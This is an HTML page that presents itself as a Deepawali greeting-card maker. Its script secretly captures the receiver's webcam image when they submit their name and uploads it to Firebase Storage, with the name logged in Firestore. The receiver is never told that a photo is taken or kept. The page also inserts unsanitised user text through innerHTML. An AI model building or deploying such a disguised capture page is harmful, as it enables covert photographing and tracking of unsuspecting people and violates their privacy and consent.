<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Deepawali Wishes</title>
    <style>
        /* Main styling */
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background: url('download.jpeg') no-repeat center center fixed;
            background-size: cover;
            font-family: Arial, sans-serif;
            color: #fff;
            text-align: center;
        }
        .container, .popup, .receiver-popup, .message-popup {
            background-color: rgba(0, 0, 0, 0.7);
            padding: 20px;
            border-radius: 10px;
            width: 300px;
            display: none;
            flex-direction: column;
            align-items: center;
        }
        .container {
            display: flex;
        }
        input[type="text"], textarea {
            padding: 10px;
            border: none;
            border-radius: 5px;
            margin-bottom: 10px;
            font-size: 16px;
            width: 100%;
        }
        button {
            background: #FF5722;
            color: white;
            border: none;
            border-radius: 5px;
            width: 100%;
            height: 50px;
            font-size: 18px;
            cursor: pointer;
            outline: none;
            transition: transform 0.3s ease;
        }
        button:hover {
            transform: scale(1.05);
        }
        .loader {
            display: none;
            border: 5px solid #f3f3f3;
            border-radius: 50%;
            border-top: 5px solid #FF5722;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

    <audio id="background-music" loop>
        <source src="music.mp3" type="audio/mpeg">
        Your browser does not support the audio element.
    </audio>

    <!-- Main Container -->
    <div class="container" id="mainContainer">
        <h1>Happy Deepawali Wishes</h1>
        <button onclick="startProcess()">Create Your Wish</button>
    </div>

    <!-- Sender Popup -->
    <div class="popup" id="senderPopup">
        <h2>Enter Your Details</h2>
        <input type="text" id="senderName" placeholder="Your Name" required>
        <input type="text" id="senderDignity" placeholder="Your Title (e.g., Friend)">
        <textarea id="senderMessage" placeholder="Your Message" required></textarea>
        <button onclick="generateLink()">Generate Link</button>
    </div>

    <!-- Share Link Popup -->
    <div class="popup" id="linkPopup">
        <h2>Share this link</h2>
        <p id="generatedLink"></p>
        <button onclick="copyLink()">Copy Link</button>
    </div>

    <!-- Receiver Popup -->
    <div class="receiver-popup" id="receiverPopup">
        <h2>Enter Your Name</h2>
        <input type="text" id="receiverName" placeholder="Receiver's Name" required>
        <button onclick="captureReceiverImage()">Submit</button>
        <div class="loader" id="loader"></div>
    </div>

    <!-- Message Popup -->
    <div class="message-popup" id="messagePopup">
        <h2>Deepawali Wishes</h2>
        <p id="letterContent"></p>
    </div>
<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.1.2/firebase-app.js";
    import { getStorage, ref, uploadBytes, getDownloadURL } from "https://www.gstatic.com/firebasejs/9.1.2/firebase-storage.js";
    import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/9.1.2/firebase-firestore.js";

    const firebaseConfig = {
        apiKey: "YOUR_API_KEY",
        authDomain: "YOUR_AUTH_DOMAIN",
        projectId: "YOUR_PROJECT_ID",
        storageBucket: "YOUR_STORAGE_BUCKET",
        messagingSenderId: "YOUR_MESSAGING_SENDER_ID",
        appId: "YOUR_APP_ID"
    };

    const app = initializeApp(firebaseConfig);
    const storage = getStorage(app);
    const db = getFirestore(app);

    let senderDetails = {};

    // Define startProcess as a global function
    window.startProcess = function() {
        console.log("Start process triggered"); // Debug
        document.getElementById("mainContainer").style.display = "none";
        document.getElementById("senderPopup").style.display = "flex";

        const audio = document.getElementById("background-music");
        audio.play().catch(error => console.log("Audio play error:", error));
    };

    window.generateLink = function() {
        console.log("Generate link triggered"); // Debug
        senderDetails.name = document.getElementById("senderName").value;
        senderDetails.dignity = document.getElementById("senderDignity").value;
        senderDetails.message = document.getElementById("senderMessage").value;

        if (!senderDetails.name || !senderDetails.message) {
            alert("Please enter your name and message.");
            return;
        }

        document.getElementById("senderPopup").style.display = "none";
        document.getElementById("linkPopup").style.display = "flex";
        document.getElementById("generatedLink").textContent = `www.yourwebsite.com/receiver.html?sender=${senderDetails.name}`;
    };

    window.copyLink = function() {
        navigator.clipboard.writeText(document.getElementById("generatedLink").textContent);
        alert("Link copied to clipboard!");
    };

    window.captureReceiverImage = async function() {
        const receiverName = document.getElementById("receiverName").value;
        if (!receiverName) {
            alert("Please enter your name.");
            return;
        }

        document.getElementById("loader").style.display = "block";
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement("video");
        video.srcObject = stream;
        await new Promise(resolve => video.onloadedmetadata = resolve);

        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext("2d").drawImage(video, 0, 0);

        const blob = await new Promise(resolve => canvas.toBlob(resolve));
        const storageRef = ref(storage, `receiver_images/${receiverName}.png`);
        await uploadBytes(storageRef, blob);

        const imageUrl = await getDownloadURL(storageRef);
        await saveReceiverData(receiverName, imageUrl);

        stream.getTracks().forEach(track => track.stop());
        displayMessage(receiverName, imageUrl);
    };

    async function saveReceiverData(name, imageUrl) {
        await addDoc(collection(db, "receivers"), {
            name: name,
            imageUrl: imageUrl
        });
    }

    function displayMessage(receiverName, imageUrl) {
        document.getElementById("receiverPopup").style.display = "none";
        document.getElementById("messagePopup").style.display = "flex";

        const letterContent = `
            Dear ${receiverName},<br><br>
            ${senderDetails.message}<br><br>
            Best regards,<br>${senderDetails.name} (${senderDetails.dignity})
        `;
        document.getElementById("letterContent").innerHTML = letterContent;
        document.getElementById("loader").style.display = "none";
    }
</script>

</body>
</html>
